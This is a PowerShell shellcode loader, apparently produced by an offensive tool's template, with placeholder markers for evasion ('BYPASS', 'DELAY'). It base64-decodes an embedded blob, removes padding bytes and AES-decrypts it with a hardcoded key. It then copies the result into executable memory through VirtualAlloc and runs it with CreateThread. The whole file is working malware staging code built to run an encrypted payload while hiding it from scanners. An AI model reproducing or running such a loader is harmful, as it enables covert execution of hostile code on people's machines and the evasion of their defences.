function Invoke-Base64Decode(){
    param(
        [Parameter(Mandatory=$True, Position=0)]
        [object] $Data
    )

    if ($Data.GetType().Name -eq "String"){
        return ([System.Convert]::FromBase64String($Data))
    }
    elseif ($Data.GetType().Name -eq "Byte[]"){
        return ([System.Convert]::FromBase64String([Encoding.UTF8]::GetString($Data)))
    }
}
function Invoke-NopDecode {
    [CmdletBinding()]

    param
    (
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    [byte[]] $encoded = [System.Byte[]]::new(($Data.Length+1)/2)
    $j = 0
    for ($i = 0; $i -lt $Data.length; $i++) {
        if ($i%2 -eq 0){
            $encoded[$j] = $Data[$i]
            $j++
        }
    }
    return $encoded
}
function Invoke-AesDecrypt
{
    [CmdletBinding()]
    param
    (
    [Parameter(Mandatory=$True)]
    [byte[]]$Encrypted,
    [Parameter(Mandatory=$False)]
    [string]$Key
    )

    $DecryptionKey = 'k%AhkciI(_AJ)-0mr9Nk9Qw7y4Z1YdJb7azg'

    if(-not([string]::IsNullOrEmpty($Key))){
        $DecryptionKey = $Key
    }

    $salt = [System.Text.Encoding]::UTF8.GetBytes("gNcMcZU3hb:A264EW;");
    $pdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($DecryptionKey, $salt)

    $AESKey = $pdb.GetBytes(32);
    $AESIV = $pdb.GetBytes(16);
    $AES = New-Object Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::None
    $AES.BlockSize = 128
    $AES.KeySize = 256


    $ms = [System.IO.MemoryStream]::new()

    $cs = New-Object System.Security.Cryptography.CryptoStream(
        $ms,
        $AES.CreateDecryptor($AESKey, $AESIV),
        [System.Security.Cryptography.CryptoStreamMode]::Write
        );

    $cs.Write($Encrypted, 0, $Encrypted.Length)
    $cs.Close()
    $decrypted = $ms.ToArray()
    $ms.Dispose()

    return $decrypted;
}
####CODE####

function Invoke-IronCyclone(){
    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);
    }
"@
    Add-Type $Win32

    $encoded = "FZAYkJGQTpC8kMCQFZBEkDaQs5AVkAeQU5ChkJ+QPJCBkOGQT5DmkE2Qj5DIkFKQsJCokFyQxZCukHiQC5DZkDaQZZCQkPyQb5BUkMuQFJDvkFmQ05AKkHKQE5DFkDGQoZCTkByQfZCfkImQsZApkGWQiJBBkFuQH5BWkMuQvpDvkFKQR5CnkJCQM5BPkPqQrJAykOiQzpBjkOyQMpBxkLiQhJBTkGmQhJCokBSQOpC4kGKQyJBgkKqQuZDxkIKQKZDZkLqQs5DukICQcZCvkAKQvZANkDGQk5ACkFOQE5BwkCiQq5B5kLiQNpB4kIiQ05C/kFaQv5AckEeQuJBAkKyQi5C7kLGQWpBEkKuQN5ArkBGQsZD+kNOQXpAKkNSQRZBnkCyQtZB9kH+QipDQkI6QmJDZkD2QKJBKkIGQ9pAUkMGQDJCykOWQG5CPkAiQzZDfkI+QaJCWkGiQKJDhkBCQ+5BUkLuQhJCDkMiQ0JBAkIaQi5CIkJGQgJDMkKOQspCHkOiQeJA+kKGQb5DCkA6QoJCCkGqQM5AKkIeQC5B6kBCQHpDJkHSQQJDZkEaQZJDWkGmQEZDhkBOQ8pDGkLuQ3JCQkKOQApD3kFaQRpC1kLiQppDckDuQc5B4kMSQ75DZkPSQQZBIkBSQkJCZkCCQr5DnkCyQ7JAVkJmQUZAlkNqQEJAbkEeQE5AfkDKQZpBKkCGQVZDYkOKQppCXkKSQGZBXkBWQwpCakEaQxZAnkH6Q45CEkP2Qf5DpkLyQGZB0kJyQbJA7kGyQgJDskL2Q3JBqkFKQqZChkOCQlJBdkKmQ+5C+kMqQW5A7kJCQhZBLkKiQ9JBhkBaQ0ZDfkJCQ25BQkMiQYJCUkLeQH5AikJCQX5DEkBGQdJAJkDWQHJCPkBKQdJDQkNeQRJBskFyQ35BrkPaQYpB/kB+QOJAOkIaQDZB9kOWQHpBvkEWQWZA8kECQZJAzkGGQAZBYkH2QzJCgkMaQQJAxkNSQnZDzkMWQlZD1kAyQj5CwkBaQGZBkkJyQkJCakIyQ85DpkF6Q6pBKkIOQwZA+kHmQv5AikM6Qy5DIkDCQ2pCRkLmQ3pDOkHWQ95BykK2QHpC5kA=="

    [byte[]] $decoded = (Invoke-AesDecrypt (Invoke-NopDecode (Invoke-Base64Decode $encoded)));
####CALL####

    $size = $decoded.Length
    [IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x3000,0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($decoded, 0, $addr, $size)
    $thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
    [Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
}

####DELAY####

####BYPASS####

Invoke-IronCyclone